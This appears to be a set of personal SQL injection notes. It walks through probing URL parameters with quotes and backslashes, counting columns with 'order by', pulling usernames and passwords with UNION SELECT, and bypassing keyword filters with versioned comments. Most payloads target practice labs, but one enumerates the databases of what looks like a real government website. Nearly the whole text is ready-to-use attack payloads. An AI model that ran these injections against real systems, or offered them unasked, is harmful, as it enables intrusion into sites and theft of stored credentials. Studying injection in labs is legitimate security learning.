...
```
1. search php?id=
2. put id=1' or " or / to check for errors
...
```
1. insert ' at end of url to check whether the url is vulnerable to sql injection 
   link must be of type  (http://testphp.vulnweb.com/artists.php?artist=1)
...
2. find out number of columns in the database using
   http://testphp.vulnweb.com/artists.php?artist=1 order by 1,2,3--  
   or http://192.168.1.102/bWAPP/sqli_1.php?title=1' order by 1-- -   
   and so on..... if check error message givn by the sql database on the required number. Number starting from maximum to minimum....
   (in this website there are 3 columns ) 
3. Now find the table name
   ...
   (try this url with three types 
        http://testphp.vulnweb.com/artists.php?artist=-1
        http://testphp.vulnweb.com/artists.php?artist=1'
        http://testphp.vulnweb.com/artists.php?artist=-1'
   )

4. union select null,null,password,4,email,null,null%20 from users-- -

	{ 
	Example lyrics app.... hack.me
	http://s101691-103027-vvl.croto.hack.me/api.php?id=7 union select null,id,group_concat(Username:,username," ",Password:,password),null from users
			to check sqli in website there are three method -- 

			1. by using '(single quote)
			2. by using \(back slash)
			3. by using -(hiphen)
...
1. identify sqli vulnerability 
	'
	"
	\ it is best to check whether the url is vulnerable or not  because it gives the closing character after we use the \ character. I twill be less confusing 
...
2. balance the query 
	...
	how to fix 	http://192.168.1.103/sqli-labs-master/Less-1/?id=1'   --+

		select id ='1'    --+' where name ='xyz' {background}

	Less-2 

		in background select id=1  --+where name =xyz

		how to fix query http://192.168.1.103/sqli-labs-master/Less-2/?id=1   --+
...
we can not assume the database then 
...
Error Based Double Query Exploitaion 
	...
	what about other database, if want to fetch remaining database,	you have to increase first value of first limit 
...
# is also used for comment out part of sqli qyery 
...
when i tried ' union all select 1,2,3,4,5,6,7 --+

i got not acceptable error either union may be illegal keyword may be all will be illegal input 

	select 	illegal word (word)= /*!12345word*/

	' /*!12345union*/ all select 1,2,3 --+

	http://multan.gov.pk/page.php?data=-2' /*!12345union*/ all select 1,2,database(),4,5,6,7 --+

now exploit this database list

	hackbar->union->database->group_concat 
	on any reflect no (SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)
